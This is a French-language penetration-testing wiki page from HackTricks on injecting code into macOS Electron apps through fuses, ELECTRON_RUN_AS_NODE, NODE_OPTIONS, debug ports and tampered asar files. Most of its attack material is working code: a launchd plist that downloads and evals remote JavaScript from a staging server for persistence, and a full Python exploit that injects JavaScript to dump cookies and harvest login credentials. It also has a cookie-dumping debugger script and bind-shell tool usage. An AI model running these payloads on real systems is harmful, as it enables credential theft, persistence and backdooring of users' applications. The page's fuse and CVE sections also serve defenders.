# Injection dans les applications Electron de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Si vous ne savez pas ce qu'est Electron, vous trouverez [**beaucoup d'informations ici**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Mais pour l'instant, sachez simplement qu'Electron exécute **node**.\
Et node possède certains **paramètres** et **variables d'environnement** qui peuvent être utilisés pour **lui faire exécuter un autre code**, en plus du fichier indiqué.

### Electron Fuses

Ces techniques seront abordées ci-dessous, mais récemment Electron a ajouté plusieurs **indicateurs de sécurité pour les empêcher**. Ce sont les [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), et voici ceux utilisés pour **empêcher** les applications Electron sur macOS de **charger du code arbitraire** :<sup>[[1]](#references)</sup>

- **`RunAsNode`** : S'il est désactivé, il empêche l'utilisation de la variable d'environnement **`ELECTRON_RUN_AS_NODE`** pour injecter du code.
- **`EnableNodeCliInspectArguments`** : S'il est désactivé, les paramètres tels que `--inspect` et `--inspect-brk` ne seront pas pris en compte. Cela évite cette méthode d'injection de code.
- **`EnableEmbeddedAsarIntegrityValidation`** : S'il est activé, le **fichier** **`asar`** chargé sera **validé** par macOS. Cela **empêche** ainsi l'**injection de code** en modifiant le contenu de ce fichier.
- **`OnlyLoadAppFromAsar`** : Si cette option est activée, au lieu de rechercher les fichiers dans l'ordre suivant : **`app.asar`**, **`app`**, puis **`default_app.asar`**, Electron vérifiera et utilisera uniquement app.asar, garantissant ainsi que lorsqu'elle est **combinée** avec le fuse **`embeddedAsarIntegrityValidation`**, il est **impossible de charger du code non validé**.
- **`LoadBrowserProcessSpecificV8Snapshot`** : Si cette option est activée, le processus du navigateur utilise le fichier appelé `browser_v8_context_snapshot.bin` pour son snapshot V8.

Un autre fuse intéressant qui n'empêchera pas l'injection de code est :

- **EnableCookieEncryption** : Si cette option est activée, le stockage des cookies sur le disque est chiffré à l'aide de clés cryptographiques au niveau du système d'exploitation.

### Vérification des Electron Fuses

Vous pouvez **vérifier ces indicateurs** depuis une application avec :
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modification des Electron Fuses

Comme l’indique la [**documentation**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuration des **Electron Fuses** se trouve dans le **binaire Electron**, qui contient quelque part la chaîne **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

Dans les applications macOS, elle se trouve généralement dans `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Vous pouvez charger ce fichier dans [https://hexed.it/](https://hexed.it/) et rechercher la chaîne précédente. Après cette chaîne, vous pouvez voir en ASCII un nombre « 0 » ou « 1 » indiquant si chaque fuse est désactivé ou activé. Il suffit de modifier le code hexadécimal (`0x30` correspond à `0` et `0x31` à `1`) pour **modifier les valeurs des fuses**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Notez que si vous essayez d’**écraser** le binaire **`Electron Framework`** à l’intérieur d’une application après avoir modifié ces octets, l’application ne s’exécutera pas.

## RCE en ajoutant du code aux applications Electron

Il peut y avoir des **fichiers JS/HTML externes** utilisés par une application Electron. Un attaquant pourrait donc injecter du code dans ces fichiers, dont la signature ne sera pas vérifiée, et exécuter du code arbitraire dans le contexte de l’application.

> [!CAUTION]
> Cependant, il existe actuellement 2 limitations :
>
> - La permission **`kTCCServiceSystemPolicyAppBundles`** est **nécessaire** pour modifier une application, ce qui n’est donc plus possible par défaut.
> - Le fichier **`asap`** compilé possède généralement les fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** **activés**
>
> Ce qui rend ce vecteur d’attaque plus complexe (voire impossible).

Notez qu’il est possible de contourner l’exigence de **`kTCCServiceSystemPolicyAppBundles`** en copiant l’application dans un autre répertoire (comme **`/tmp`**), en renommant le dossier **`app.app/Contents`** en **`app.app/NotCon`**, en **modifiant** le fichier **asar** avec votre code **malicious**, en le renommant ensuite en **`app.app/Contents`**, puis en l’exécutant.<sup>[[5]](#references)</sup>

Vous pouvez décompresser le code du fichier asar avec :
```bash
npx asar extract app.asar app-decomp
```
Et recompressez-le après l’avoir modifié avec :
```bash
npx asar pack app-decomp app-new.asar
```
## RCE avec ELECTRON_RUN_AS_NODE

Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), si cette variable d'environnement est définie, elle démarrera le processus comme un processus Node.js normal.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Si le fuse **`RunAsNode`** est désactivé, la variable d’environnement **`ELECTRON_RUN_AS_NODE`** sera ignorée et cela ne fonctionnera pas.

### Injection depuis le Plist de l’application

Comme [**proposé ici**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), vous pouvez exploiter cette variable d’environnement dans un plist afin de maintenir la persistance :<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE avec `NODE_OPTIONS`

Vous pouvez stocker le payload dans un autre fichier et l’exécuter :
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Si le fuse **`EnableNodeOptionsEnvironmentVariable`** est **désactivé**, l'application **ignorera** la variable d'environnement **NODE_OPTIONS** lors de son lancement, sauf si la variable d'environnement **`ELECTRON_RUN_AS_NODE`** est définie, laquelle sera également **ignorée** si le fuse **`RunAsNode`** est désactivé.
>
> Si vous ne définissez pas **`ELECTRON_RUN_AS_NODE`**, vous rencontrerez l'**erreur** suivante : `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection depuis le Plist de l'application

Vous pouvez abuser de cette variable d'environnement dans un plist afin de maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE avec inspection

Selon [**ceci**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), si vous exécutez une application Electron avec des flags tels que **`--inspect`**, **`--inspect-brk`** et **`--remote-debugging-port`**, un **port de debug sera ouvert**, ce qui vous permettra de vous y connecter (par exemple depuis Chrome via `chrome://inspect`) et d’**injecter du code** ou même de lancer de nouveaux processus.<sup>[[7]](#references)</sup>\
Par exemple :
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
Dans [**cet article de blog**](https://hackerone.com/reports/1274695), ce débogage est exploité pour faire **télécharger à headless chrome des fichiers arbitraires dans des emplacements arbitraires**.<sup>[[8]](#references)</sup>

> [!TIP]
> Si une application dispose de sa propre méthode pour vérifier si des variables d’environnement ou des paramètres tels que `--inspect` sont définis, vous pouvez essayer de la **contourner** lors de l’exécution en utilisant l’argument `--inspect-brk`, qui **arrêtera l’exécution** au début de l’application et exécutera un bypass (en réécrivant par exemple les arguments ou les variables d’environnement du processus actuel).

Ce qui suit était un exploit dans lequel le monitoring et l’exécution de l’application avec le paramètre `--inspect-brk` permettaient de contourner la protection personnalisée qu’elle possédait (en réécrivant les paramètres du processus pour supprimer `--inspect-brk`), puis d’injecter un payload JS afin de dump les cookies et les identifiants de l’application :
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Si le fuse **`EnableNodeCliInspectArguments`** est désactivé, l'application ignorera les paramètres node (tels que **`--inspect`**) lors de son lancement, sauf si la variable d'environnement **`ELECTRON_RUN_AS_NODE`** est définie, ce qui sera également ignoré si le fuse **`RunAsNode`** est désactivé.
>
> Cependant, vous pouvez toujours utiliser le **paramètre electron `--remote-debugging-port=9229`**, mais le payload précédent ne fonctionnera pas pour exécuter d'autres processus.

En utilisant le paramètre **`--remote-debugging-port=9222`**, il est possible de voler certaines informations de l'Electron App, comme l'**historique** (avec des commandes GET) ou les **cookies** du browser (puisqu'ils sont **décryptés** dans le browser et qu'il existe un **endpoint json** qui les fournit).

Vous pouvez apprendre à faire cela [**ici**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) et [**ici**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), et utiliser l'outil automatique [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ou un simple script comme celui-ci :<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection depuis le Plist de l'application

Vous pourriez exploiter cette variable d'environnement dans un plist pour maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> Le daemon TCC de macOS ne vérifie pas la version exécutée de l’application. Ainsi, si vous **ne pouvez pas injecter de code dans une application Electron** avec l’une des techniques précédentes, vous pouvez télécharger une version antérieure de l’APP et y injecter du code, car elle conservera les privilèges TCC (sauf si le Trust Cache l’en empêche).

## Run non JS Code

Les techniques précédentes vous permettent d’exécuter du **code JS à l’intérieur du processus de l’application Electron**. Cependant, rappelez-vous que les **processus enfants s’exécutent avec le même profil sandbox** que l’application parente et **héritent de ses permissions TCC**.\
Par conséquent, si vous souhaitez abuser des entitlements pour accéder à la caméra ou au microphone, par exemple, vous pouvez simplement **exécuter un autre binaire depuis le processus**.

## Notable Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 et différentes pre-releases 23-27 permettaient à un attaquant disposant d’un accès en écriture au dossier `.app/Contents/Resources` de contourner les fuses `embeddedAsarIntegrityValidation` **et** `onlyLoadAppFromAsar`. Le bug était une *confusion de type de fichier* dans le vérificateur d’intégrité, qui permettait de charger un **répertoire nommé `app.asar`** à la place de l’archive validée ; tout JavaScript placé dans ce répertoire était donc exécuté au démarrage de l’application. Même les vendors qui avaient suivi les recommandations de hardening et activé les deux fuses restaient donc vulnérables sur macOS.<sup>[[3]](#references)</sup>

Versions d’Electron corrigées : **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** et **27.0.0-alpha.7**. Les attaquants qui trouvent une application exécutant une build plus ancienne peuvent remplacer `Contents/Resources/app.asar` par leur propre répertoire afin d’exécuter du code avec les entitlements TCC de l’application.<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

En janvier 2024, une série de CVE (CVE-2024-23738 à CVE-2024-23743) a montré que de nombreuses applications Electron sont livrées avec les fuses **RunAsNode** et **EnableNodeCliInspectArguments** toujours activés. Un attaquant local peut donc relancer le programme avec la variable d’environnement `ELECTRON_RUN_AS_NODE=1` ou des flags tels que `--inspect-brk` afin de le transformer en processus Node.js *générique* et d’hériter de l’ensemble des permissions sandbox et TCC de l’application.<sup>[[4]](#references)</sup>

Bien que l’équipe Electron ait contesté la classification « critique » et indiqué qu’un attaquant devait déjà disposer d’une exécution de code locale, le problème reste utile lors du post-exploitation, car il transforme tout bundle Electron vulnérable en binaire *living-off-the-land* pouvant, par exemple, lire les Contacts, Photos ou autres ressources sensibles précédemment accordées à l’application desktop.<sup>[[4]](#references)</sup>

Recommandations défensives des mainteneurs d’Electron :<sup>[[4]](#references)</sup>

* Désactiver les fuses `RunAsNode` et `EnableNodeCliInspectArguments` dans les builds de production.
* Utiliser la nouvelle API **UtilityProcess** si votre application a légitimement besoin d’un processus Node.js auxiliaire, plutôt que de réactiver ces fuses.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

L’outil [**electroniz3r**](https://github.com/r3ggi/electroniz3r) peut facilement être utilisé pour **trouver les applications electron vulnérables** installées et y injecter du code. Cet outil tentera d’utiliser la technique **`--inspect`** :<sup>[[5]](#references)</sup>

Vous devez le compiler vous-même et pouvez l’utiliser comme ceci :
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki a été conçu pour backdoor des applications Electron en remplaçant les fichiers JavaScript des applications par les fichiers JavaScript de Command & Control de Loki.

## Références

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Injection macOS via des frameworks tiers - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Contournement de l’intégrité ASAR via une confusion de type de fichier (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Déclaration concernant les CVE de « runAsNode » - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing la confidentialité macOS - Une nouvelle arme dans votre arsenal de Red Teaming - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Variables d’environnement | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Pourquoi les applications Electron ne peuvent pas stocker vos secrets de manière confidentielle : option --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Rapport HackerOne n° 1274695 - Le debugging d’Electron exploité pour télécharger des fichiers arbitraires](https://hackerone.com/reports/1274695)
- [9] [Les mains dans le Cookie Jar : Dumping des cookies avec le port Remote Debugger de Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging des échecs de Cookie Dumping avec le Remote Debugger de Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
